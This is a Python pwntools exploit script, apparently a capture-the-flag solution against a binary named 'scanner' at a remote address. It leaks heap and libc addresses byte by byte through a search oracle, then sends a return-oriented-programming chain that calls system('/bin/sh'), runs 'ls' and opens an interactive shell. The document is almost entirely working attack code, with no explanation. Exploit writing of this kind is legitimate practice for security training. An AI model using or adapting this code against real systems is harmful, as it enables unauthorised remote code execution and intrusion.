from pwn import * 
libc=ELF("./libc.so.6")
def s():
	sleep(0.1)
def debug():
	gdb.attach(p,'''
		b* main+288
		c
		p $rbp-$rsp
		''')

def read_buffer(input):
	p.recvuntil("0. Exit")
	p.sendline("1")
	p.recvuntil("Enter new buffer: ")
	p.sendline(input)
	#s()

def f(input):
	n=len(input)
	p.recvuntil("0. Exit")
	p.sendline("3")
	p.recvuntil("Enter parameters: ")

	p.sendline(f"naive2 {n}")
	global c 
	p.sendline(input)
	if b"Found at i=" in p.recvline():
		return 1 
	return 0
while(True):
	try:
		print("hey")
		cond=1
		#p=process("./scanner")
		p=remote("94.237.54.75",34463)
		read_buffer("a"*4095)
		#debug()
		msg=b"\x00"
		res=b""
		for i in range(8):
			c=0

			while(not f(msg+c.to_bytes(1,'big'))):
				c+=1
			print(c)
			msg+=c.to_bytes(1,'big')
			res+=c.to_bytes(1,'big')

		heap=u64(res)
		print("-------------------------")
		print(hex(heap))
		print("-------------------------")
		l=[b"\x00"+p64(heap+0x20),26,1,0,b""]
		res=b""
		for i in range(8):
			c=0
			while(not f(l[0]+p32(l[1])+p32(l[2])+p64(0)+l[4]+c.to_bytes(1,'big'))):
				c+=1
			l[4]+=c.to_bytes(1,'big')
			l[1]=l[1]+1
			res+=c.to_bytes(1,'big')
		leak2=u64(res)

		libc.address=leak2-0x24083
		#recreate stack
		read_buffer(b"c"*0xf60+p64(heap)+p32(0)+p32(0)+b"d"*(0xfff-0xf70)) # required offset f70

		# last phase

	#	p.recvuntil("0. Exit")
		p.sendline("3")

		p.sendline(b"naive1"+b"\x00"*10+b" 5")
	#	p.recvuntil("Enter parameters: ")
		p.sendline("bbbbb")

		rdi=libc.address+0x0000000000023b6a
		system=libc.symbols["system"]
		ret=libc.address+0x0000000000022679
		binsh=next(libc.search(b"/bin/sh"))


		p.sendline("1")
		
		p.sendline(p64(ret)*200+p64(rdi)+p64(binsh)+p64(system))
	#	p.recvuntil("0. Exit")
		p.recvline()
		p.sendline("ls")
		print(p.recvline())
		
	except:
		cond=0
		p.close()
	if cond:
		print("!!!!!!!!!!!!!!!!!!")
		p.interactive()
		